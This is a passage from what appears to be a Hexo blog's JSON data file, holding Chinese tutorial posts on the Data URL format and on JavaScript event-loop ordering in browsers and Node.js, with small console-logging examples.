type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一部分是<code>data：</code>协议头，它标识这个内容为一个 dataurl 资源</li>\n<li>第二部分是 MIME 类型，表示这串内容的展现方式，比如 text/plain，就是文本展示;image/jpeg,就是以 jpeg 图片形式展示，同样浏览器会根据这个 MIME 类型来解析数据。</li>\n<li>第三部分是编码设置，默认编码是 charset=US-ASCII，可以在浏览器输入框分别输入下面内容：</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// output: &amp;auml;&amp;frac12; &amp;aring;&amp;yen;&amp;frac12; -&gt; 使用默认的编码展示，故乱码</span></span><br><span class=\"line\">data:text/html,你好</span><br><span class=\"line\"><span class=\"comment\">// output: 你好 -&gt; 使用 UTF-8 展示</span></span><br><span class=\"line\">data:text/html;charset=UTF<span class=\"number\">-8</span>,你好</span><br><span class=\"line\"><span class=\"comment\">// output: 浣犲ソ -&gt; 使用 gbk 展示（浏览器默认编码 UTF-8，故乱码）</span></span><br><span class=\"line\">data:text/html;charset=gbk,你好</span><br><span class=\"line\"><span class=\"comment\">// output: 你好 -&gt; UTF-8 编码，内容先使用 base64 解码，然后展示</span></span><br><span class=\"line\">data:text/html;charset=UTF<span class=\"number\">-8</span>;base64,<span class=\"number\">5</span>L2g5aW9</span><br></pre></td></tr></table></figure>\n<ul>\n<li>第四部分是 base64 编码设定，可选</li>\n<li>最后一部分是这个 dataurl 承载的内容，可以是纯文本，也可以是经过 base64 编码的内容</li>\n</ul>\n<p>平时我们经常见到的是这样的：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//内嵌base64图片</span></span><br><span class=\"line\">background-image: url(<span class=\"string\">\"data:image/gif;base64,R0lGODlhAwADAIAAAP///8zMzCH5BAAAAAAALAAAAAADAAMAAAIEBHIJBQA7\"</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"Data-URL-的优劣\"><a href=\"#Data-URL-的优劣\" class=\"headerlink\" title=\"Data URL 的优劣\"></a>Data URL 的优劣</h2><h3 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h3><ul>\n<li>img 的 src 说明这个是外部资源，浏览器会向服务器拉取一次资源请求，占用网络资源</li>\n<li>大多数浏览器都有一个并发请求数不能超过 4 个的限制。如果一个网页里嵌入了太多的外部资源，请求会使整个页面加载延迟。</li>\n<li>图片体积太小的时候，不值得占用一个 http 会话</li>\n</ul>\n<h3 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h3><ul>\n<li>base64 编码的数据体积是原数据的体积 4/3，也就是说 data url 形式的图片会比二进制格式的图片体积大 1/3</li>\n<li><p>data url 形式的图片不会被浏览器缓存，这意味着每次访问这样页面的时候都会被下载一次。如果这个图片被整个网站使用，就是一个使用效率问题（已被解决）</p>\n<blockquote>\n<p>如何将 data url 数据放入浏览器缓存，通过 css 样式文件。所有浏览器都会积极缓存 css 文件来提高页面加载效率</p>\n</blockquote>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Data-URL-是什么\"><a href=\"#Data-URL-是什么\" class=\"headerlink\" title=\"Data URL 是什么\"></a>Data URL 是什么</h2><p>是一种提供让外置资源直接内嵌在页面中的方案。格式如下：</p>\n<h3 id=\"格式\"><a href=\"#格式\" class=\"headerlink\" title=\"格式\"></a>格式</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一部分是<code>data：</code>协议头，它标识这个内容为一个 dataurl 资源</li>\n<li>第二部分是 MIME 类型，表示这串内容的展现方式，比如 text/plain，就是文本展示;image/jpeg,就是以 jpeg 图片形式展示，同样浏览器会根据这个 MIME 类型来解析数据。</li>\n<li>第三部分是编码设置，默认编码是 charset=US-ASCII，可以在浏览器输入框分别输入下面内容：</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// output: &amp;auml;&amp;frac12; &amp;aring;&amp;yen;&amp;frac12; -&gt; 使用默认的编码展示，故乱码</span></span><br><span class=\"line\">data:text/html,你好</span><br><span class=\"line\"><span class=\"comment\">// output: 你好 -&gt; 使用 UTF-8 展示</span></span><br><span class=\"line\">data:text/html;charset=UTF<span class=\"number\">-8</span>,你好</span><br><span class=\"line\"><span class=\"comment\">// output: 浣犲ソ -&gt; 使用 gbk 展示（浏览器默认编码 UTF-8，故乱码）</span></span><br><span class=\"line\">data:text/html;charset=gbk,你好</span><br><span class=\"line\"><span class=\"comment\">// output: 你好 -&gt; UTF-8 编码，内容先使用 base64 解码，然后展示</span></span><br><span class=\"line\">data:text/html;charset=UTF<span class=\"number\">-8</span>;base64,<span class=\"number\">5</span>L2g5aW9</span><br></pre></td></tr></table></figure>\n<ul>\n<li>第四部分是 base64 编码设定，可选</li>\n<li>最后一部分是这个 dataurl 承载的内容，可以是纯文本，也可以是经过 base64 编码的内容</li>\n</ul>\n<p>平时我们经常见到的是这样的：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//内嵌base64图片</span></span><br><span class=\"line\">background-image: url(<span class=\"string\">\"data:image/gif;base64,R0lGODlhAwADAIAAAP///8zMzCH5BAAAAAAALAAAAAADAAMAAAIEBHIJBQA7\"</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"Data-URL-的优劣\"><a href=\"#Data-URL-的优劣\" class=\"headerlink\" title=\"Data URL 的优劣\"></a>Data URL 的优劣</h2><h3 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h3><ul>\n<li>img 的 src 说明这个是外部资源，浏览器会向服务器拉取一次资源请求，占用网络资源</li>\n<li>大多数浏览器都有一个并发请求数不能超过 4 个的限制。如果一个网页里嵌入了太多的外部资源，请求会使整个页面加载延迟。</li>\n<li>图片体积太小的时候，不值得占用一个 http 会话</li>\n</ul>\n<h3 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h3><ul>\n<li>base64 编码的数据体积是原数据的体积 4/3，也就是说 data url 形式的图片会比二进制格式的图片体积大 1/3</li>\n<li><p>data url 形式的图片不会被浏览器缓存，这意味着每次访问这样页面的时候都会被下载一次。如果这个图片被整个网站使用，就是一个使用效率问题（已被解决）</p>\n<blockquote>\n<p>如何将 data url 数据放入浏览器缓存，通过 css 样式文件。所有浏览器都会积极缓存 css 文件来提高页面加载效率</p>\n</blockquote>\n</li>\n</ul>\n"},{"title":"学习一下Event Loop","date":"2018-07-04T08:57:08.000Z","_content":"\n## 浏览器中 Event Loop\n\n> 因为 js 最初是为了和浏览器交互，是一门非阻塞单线程语言。如果多线程处理 dom 可能会有一些意想不到的问题，比如一个线程中增加节点，另外一个线程删除节点。当然引入读写锁可以解决这个问题。\n\n### 执行栈和队列\n\n- js 在执行过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 task（有多种）队列中。一旦执行栈为空，event-loop 就会从 task 队列中拿出需要执行的代码并放入执行栈中执行。所以本质上来说 js 的异步还是同步行为。\n\n### 任务源\n\n- 不同的任务源会被分配到不同的 task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。\n- 在 es6 中，microtask 被称为 jobs，macrotask 被称为 task\n\n```javascript\nconsole.log(\"script start\");\n\nsetTimeout(function() {\n  console.log(\"setTimeout\");\n}, 0);\n\nnew Promise(resolve => {\n  console.log(\"Promise\");\n  resolve();\n})\n  .then(function() {\n    console.log(\"promise1\");\n  })\n  .then(function() {\n    console.log(\"promise2\");\n  });\n\nconsole.log(\"script end\");\n// script start => Promise => script end => promise1 => promise2 => setTimeout\n```\n\n- 微任务包括 process.nextTick,promise,Object.ovserve,MutationObserve\n- 宏任务包括 script，setTimeout，setInterval,setImmediate,I/O,UI rendering\n- 很多人认为微任务一定快于宏任务，其实是错的。因为宏任务中包括了 script，浏览器会执行一个宏任务，接下来有异步代码的话会先执行微任务。\n\n### 正确的一次 Event-loop 顺序\n\n- 执行同步代码，这属于宏任务\n- 执行栈为空，查询是否有微任务需要执行\n- 执行所有微任务\n- 必要的话渲染 ui\n- 开始下一轮 event-loop，执行宏任务中的异步代码\n\n所以宏任务中的异步代码有大量的计算并且需要操作 dom 的话，为了更快的界面响应，我们可以把操作 dom 放入微任务中。思考一下 vue ～\n\n## node 中的 event loop\n\n> node 中的 event loop （存在于 libuv 中）和浏览器的不一样，分为以下六个阶段，他们会按照顺序反复执行\n\n### timers\n\n- 会执行 setTimeout 和 setInterval\n- 一个 timer 指定的事件并不是准确时间，而是在达到这个时间后尽快执行回调，可能会因为系统正在执行别的事务而延迟。\n- 下限的时间会有个范围\n\n### I/O callbacks\n\n- 会执行除了 close 事件，定时器和 setImmediat 的回调\n\n### idle，prepare\n\n- idle，prepare 阶段内部实现\n\n### poll 阶段\n\n- poll 阶段很重要，这一阶段中，系统会做两件事情\n  - 执行到点的定时器\n  - 执行 poll 队列中的事件\n- 如果有别的定时器需要被执行，会回到 timer 阶段执行回调\n\n### check 阶段\n\n- 执行 setImmediate\n\n### close callbacks\n\n- 执行 close 事件\n\n## node 中执行顺序举例\n\n- 有些情况下，定时器执行顺序是随机的\n\n```javascript\nsetTimeout(() => {\n  console.log(\"setTimeout\");\n}, 0);\nsetImmediate(() => {\n  console.log(\"setImmediate\");\n});\n// 这里可能会输出 setTimeout，setImmediate\n// 可能也会相反的输出，这取决于性能\n// 因为可能进入 event loop 用了不到 1 毫秒，这时候会执行 setImmediate\n// 否则会执行 setTimeout\n```\n\n- 有些情况下是一定的\n\n```java\nvar fs = require('fs')\n\nfs.readFile(__filename, () => {\n    setTimeout(() => {\n        console.log('timeout');\n    }, 0);\n    setImmediate(() => {\n        console.log('immediate');\n    });\n});\n// 因为 readFile 的回调在 poll 中执行\n// 发现有 setImmediate ，所以会立即跳到 check 阶段执行回调\n// 再去 timer 阶段执行 setTimeout\n// 所以以上输出一定是 setImmediate，setTimeout\n```\n\n- 上面都是 macrotask 的执行情况，microtask 会在以上每个阶段完成后立即执行\n\n```javascript\nsetTimeout(() => {\n  console.log(\"timer1\");\n\n  Promise.resolve().then(function() {\n    console.log(\"promise1\");\n  });\n}, 0);\n\nsetTimeout(() => {\n  console.log(\"timer2\");\n\n  Promise.resolve().then(function() {\n    console.log(\"promise2\");\n  });\n}, 0);\n\n// 以上代码在浏览器和 node 中打印情况是不同的\n// 浏览器中打印 timer1, promise1, timer2, promise2\n// node 中打印 timer1, timer2, promise1, promise2\n```\n\n- node 中的 process.nextTick 会优先于其他微任务执行\n\n# 推荐阅读\n\n-\n","source":"_posts/study-event-loop.md","raw":"---\ntitle: 学习一下Event Loop\ndate: 2018-07-04 16:57:08\ntags: node\n---\n\n## 浏览器中 Event Loop\n\n> 因为 js 最初是为了和浏览器交互，是一门非阻塞单线程语言。如果多线程处理 dom 可能会有一些意想不到的问题，比如一个线程中增加节点，另外一个线程删除节点。当然引入读写锁可以解决这个问题。\n\n### 执行栈和队列\n\n- js 在执行过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 task（有多种）队列中。一旦执行栈为空，event-loop 就会从 task 队列中拿出需要执行的代码并放入执行栈中执行。所以本质上来说 js 的异步还是同步行为。\n\n### 任务源\n\n- 不同的任务源会被分配到不同的 task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。\n- 在 es6 中，microtask 被称为 jobs，macrotask 被称为 task\n\n```javascript\nconsole.log(\"script start\");\n\nsetTimeout(function() {\n  console.log(\"setTimeout\");\n}, 0);\n\nnew Promise(resolve => {\n  console.log(\"Promise\");\n  resolve();\n})\n  .then(function() {\n    console.log(\"promise1\");\n  })\n  .then(function() {\n    console.log(\"promise2\");\n  });\n\nconsole.log(\"script end\");\n// script start => Promise => script end => promise1 => promise2 => setTimeout\n```\n\n- 微任务包括 process.nextTick,promise,Object.ovserve,MutationObserve\n- 宏任务包括 script，setTimeout，setInterval,setImmediate,I/O,UI rendering\n- 很多人认为微任务一定快于宏任务，其实是错的。因为宏任务中包括了 script，浏览器会执行一个宏任务，接下来有异步代码的话会先执行微任务。\n\n### 正确的一次 Event-loop 顺序\n\n- 执行同步代码，这属于宏任务\n- 执行栈为空，查询是否有微任务需要执行\n- 执行所有微任务\n- 必要的话渲染 ui\n- 开始下一轮 event-loop，执行宏任务中的异步代码\n\n所以宏任务中的异步代码有大量的计算并且需要操作 dom 的话，为了更快的界面响应，我们可以把操作 dom 放入微任务中。思考一下 vue ～\n\n## node 中的 event loop\n\n> node 中的 event loop （存在于 libuv 中）和浏览器的不一样，分为以下六个阶段，他们会按照顺序反复执行\n\n### timers\n\n- 会执行 setTimeout 和 setInterval\n- 一个 timer 指定的事件并不是准确时间，而是在达到这个时间后尽快执行回调，可能会因为系统正在执行别的事务而延迟。\n- 下限的时间会有个范围\n\n### I/O callbacks\n\n- 会执行除了 close 事件，定时器和 setImmediat 的回调\n\n### idle，prepare\n\n- idle，prepare 阶段内部实现\n\n### poll 阶段\n\n- poll 阶段很重要，这一阶段中，系统会做两件事情\n  - 执行到点的定时器\n  - 执行 poll 队列中的事件\n- 如果有别的定时器需要被执行，会回到 timer 阶段执行回调\n\n### check 阶段\n\n- 执行 setImmediate\n\n### close callbacks\n\n- 执行 close 事件\n\n## node 中执行顺序举例\n\n- 有些情况下，定时器执行顺序是随机的\n\n```javascript\nsetTimeout(() => {\n  console.log(\"setTimeout\");\n}, 0);\nsetImmediate(() => {\n  console.log(\"setImmediate\");\n});\n// 这里可能会输出 setTimeout，setImmediate\n// 可能也会相反的输出，这取决于性能\n// 因为可能进入 event loop 用了不到 1 毫秒，这时候会执行 setImmediate\n// 否则会执行 setTimeout\n```\n\n- 有些情况下是一定的\n\n```java\nvar fs = require('fs')\n\nfs.readFile(__filename, () => {\n    setTimeout(() => {\n        console.log('timeout');\n    }, 0);\n    setImmediate(() => {\n        console.log('immediate');\n    });\n});\n// 因为 readFile 的回调在 poll 中执行\n// 发现有 setImmediate ，所以会立即跳到 check 阶段执行回调\n// 再去 timer 阶段执行 setTimeout\n// 所以以上输出一定是 setImmediate，setTimeout\n```\n\n- 上面都是 macrotask 的执行情况，microtask 会在以上每个阶段完成后立即执行\n\n```javascript\nsetTimeout(() => {\n  console.log(\"timer1\");\n\n  Promise.resolve().then(function() {\n    console.log(\"promise1\");\n  });\n}, 0);\n\nsetTimeout(() => {\n  console.log(\"timer2\");\n\n  Promise.resolve().then(function() {\n    console.log(\"promise2\");\n  });\n}, 0);\n\n// 以上代码在浏览器和 node 中打印情况是不同的\n// 浏览器中打印 timer1, promise1, timer2, promise2\n// node 中打印 timer1, timer2, promise1, promise2\n```\n\n- node 中的 process.nextTick 会优先于其他微任务执行\n\n# 推荐阅读\n\n-\n","slug":"study-event-loop","published":1,"updated":"2018-07-08T12:17:45.902Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034qm002f0iofbvgmpd3u","content":"<h2 id=\"浏览器中-Event-Loop\"><a href=\"#浏览器中-Event-Loop\" class=\"headerlink\" title=\"浏览器中 Event Loop\"></a>浏览器中 Event Loop</h2><blockquote>\n<p>因为 js 最初是为了和浏览器交互，是一门非阻塞单线程语言。如果多线程处理 dom 可能会有一些意想不到的问题，比如一个线程中增加节点，另外一个线程删除节点。当然引入读写锁可以解决这个问题。</p>\n</blockquote>\n<h3 id=\"执行栈和队列\"><a href=\"#执行栈和队列\" class=\"headerlink\" title=\"执行栈和队列\"></a>执行栈和队列</h3><ul>\n<li>js 在执行过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 task（有多种）队列中。一旦执行栈为空，event-loop 就会从 task 队列中拿出需要执行的代码并放入执行栈中执行。所以本质上来说 js 的异步还是同步行为。</li>\n</ul>\n<h3 id=\"任务源\"><a href=\"#任务源\" class=\"headerlink\" title=\"任务源\"></a>任务源</h3><ul>\n<li>不同的任务源会被分配到不同的 task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。</li>\n<li>在 es6 中，microtask 被称为 jobs，macrotask 被称为 task</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"script start\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"setTimeout\"</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\"><span class=\"params\">resolve</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Promise\"</span>);</span><br><span class=\"line\">  resolve();</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"promise1\"</span>);</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"promise2\"</span>);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"script end\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// script start =&gt; Promise =&gt; script end =&gt; promise1 =&gt; promise2 =&gt; setTimeout</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>微任务包括 process.nextTick,promise,Object.ovserve,MutationObserve</li>\n<li>宏任务包括 script，setTimeout，setInterval,setImmediate,I/O,UI rendering</li>\n<li>很多人认为微任务一定快于宏任务，其实是错的。因为宏任务中包括了 script，浏览器会执行一个宏任务，接下来有异步代码的话会先执行微任务。</li>\n</ul>\n<h3 id=\"正确的一次-Event-loop-顺序\"><a href=\"#正确的一次-Event-loop-顺序\" class=\"headerlink\" title=\"正确的一次 Event-loop 顺序\"></a>正确的一次 Event-loop 顺序</h3><ul>\n<li>执行同步代码，这属于宏任务</li>\n<li>执行栈为空，查询是否有微任务需要执行</li>\n<li>执行所有微任务</li>\n<li>必要的话渲染 ui</li>\n<li>开始下一轮 event-loop，执行宏任务中的异步代码</li>\n</ul>\n<p>所以宏任务中的异步代码有大量的计算并且需要操作 dom 的话，为了更快的界面响应，我们可以把操作 dom 放入微任务中。思考一下 vue ～</p>\n<h2 id=\"node-中的-event-loop\"><a href=\"#node-中的-event-loop\" class=\"headerlink\" title=\"node 中的 event loop\"></a>node 中的 event loop</h2><blockquote>\n<p>node 中的 event loop （存在于 libuv 中）和浏览器的不一样，分为以下六个阶段，他们会按照顺序反复执行</p>\n</blockquote>\n<h3 id=\"timers\"><a href=\"#timers\" class=\"headerlink\" title=\"timers\"></a>timers</h3><ul>\n<li>会执行 setTimeout 和 setInterval</li>\n<li>一个 timer 指定的事件并不是准确时间，而是在达到这个时间后尽快执行回调，可能会因为系统正在执行别的事务而延迟。</li>\n<li>下限的时间会有个范围</li>\n</ul>\n<h3 id=\"I-O-callbacks\"><a href=\"#I-O-callbacks\" class=\"headerlink\" title=\"I/O callbacks\"></a>I/O callbacks</h3><ul>\n<li>会执行除了 close 事件，定时器和 setImmediat 的回调</li>\n</ul>\n<h3 id=\"idle，prepare\"><a href=\"#idle，prepare\" class=\"headerlink\" title=\"idle，prepare\"></a>idle，prepare</h3><ul>\n<li>idle，prepare 阶段内部实现</li>\n</ul>\n<h3 id=\"poll-阶段\"><a href=\"#poll-阶段\" class=\"headerlink\" title=\"poll 阶段\"></a>poll 阶段</h3><ul>\n<li>poll 阶段很重要，这一阶段中，系统会做两件事情<ul>\n<li>执行到点的定时器</li>\n<li>执行 poll 队列中的事件</li>\n</ul>\n</li>\n<li>如果有别的定时器需要被执行，会回到 timer 阶段执行回调</li>\n</ul>\n<h3 id=\"check-阶段\"><a href=\"#check-阶段\" class=\"headerlink\" title=\"check 阶段\"></a>check 阶段</h3><ul>\n<li>执行 setImmediate</li>\n</ul>\n<h3 id=\"close-callbacks\"><a href=\"#close-callbacks\" class=\"headerlink\" title=\"close callbacks\"></a>close callbacks</h3><ul>\n<li>执行 close 事件</li>\n</ul>\n<h2 id=\"node-中执行顺序举例\"><a href=\"#node-中执行顺序举例\" class=\"headerlink\" title=\"node 中执行顺序举例\"></a>node 中执行顺序举例</h2><ul>\n<li>有些情况下，定时器执行顺序是随机的</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"setTimeout\"</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\">setImmediate(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"setImmediate\"</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 这里可能会输出 setTimeout，setImmediate</span></span><br><span class=\"line\"><span class=\"comment\">// 可能也会相反的输出，这取决于性能</span></span><br><span class=\"line\"><span class=\"comment\">// 因为可能进入 event loop 用了不到 1 毫秒，这时候会执行 setImmediate</span></span><br><span class=\"line\"><span class=\"comment\">// 否则会执行 setTimeout</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>有些情况下是一定的</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fs = require(<span class=\"string\">'fs'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fs.readFile(__filename, () =&gt; &#123;</span><br><span class=\"line\">    setTimeout(() =&gt; &#123;</span><br><span class=\"line\">        console.log(<span class=\"string\">'timeout'</span>);</span><br><span class=\"line\">    &#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\">    setImmediate(() =&gt; &#123;</span><br><span class=\"line\">        console.log(<span class=\"string\">'immediate'</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 因为 readFile 的回调在 poll 中执行</span></span><br><span class=\"line\"><span class=\"comment\">// 发现有 setImmediate ，所以会立即跳到 check 阶段执行回调</span></span><br><span class=\"line\"><span class=\"comment\">// 再去 timer 阶段执行 setTimeout</span></span><br><span class=\"line\"><span class=\"comment\">// 所以以上输出一定是 setImmediate，setTimeout</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>上面都是 macrotask 的执行情况，microtask 会在以上每个阶段完成后立即执行</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"timer1\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">Promise</span>.resolve().then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"promise1\"</span>);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"timer2\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">Promise</span>.resolve().then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"promise2\"</span>);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 以上代码在浏览器和 node 中打印情况是不同的</span></span><br><span class=\"line\"><span class=\"comment\">// 浏览器中打印 timer1, promise1, timer2, promise2</span></span><br><span class=\"line\"><span class=\"comment\">// node 中打印 timer1, timer2, promise1, promise2</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>node 中的 process.nextTick 会优先于其他微任务执行</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><p>-</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"浏览器中-Event-Loop\"><a href=\"#浏览器中-Event-Loop\" class=\"headerlink\" title=\"浏览器中 Event Loop\"></a>浏览器中 Event Loop</h2><blockquote>\n<p>因为 js 最初是为了和浏览器交互，是一门非阻塞单线程语言。如果多线程处理 dom 可能会有一些意想不到的问题，比如一个线程中增加节点，另外一个线程删除节点。当然引入读写锁可以解决这个问题。</p>\n</blockquote>\n<h3 id=\"执行栈和队列\"><a href=\"#执行栈和队列\" class=\"headerlink\" title=\"执行栈和队列\"></a>执行栈和队列</h3><ul>\n<li>js 在执行过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 task（有多种）队列中。一旦执行栈为空，event-loop 就会从 task 队列中拿出需要执行的代码并放入执行栈中执行。所以本质上来说 js 的异步还是同步行为。</li>\n</ul>\n<h3 id=\"任务源\"><a href=\"#任务源\" class=\"headerlink\" title=\"任务源\"></a>任务源</h3><ul>\n<li>不同的任务源会被分配到不同的 task 队列中，任务源可以分为微任务（microtask）和宏任务（macrotask）。</li>\n<li>在 es6 中，microtask 被称为 jobs，macrotask 被称为 task</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span 